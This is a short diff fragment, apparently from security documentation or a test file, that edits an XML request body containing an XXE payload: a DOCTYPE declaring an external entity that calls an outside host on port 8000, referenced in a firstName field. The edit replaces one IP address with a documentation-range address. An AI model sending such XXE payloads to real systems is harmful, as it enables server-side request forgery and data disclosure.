@@ -336,7 +336,7 @@ Content-Type: application/json;charset=UTF-8
 Content-Type: application/xml;charset=UTF-8
 
 <?xml version="1.0" encoding="UTF-8" standalone="no"?>
-<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]> 
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://198.51.100.10:8000/TEST.ext" >]> 
 <root>
  <root>
   <firstName>&xxe;</firstName>
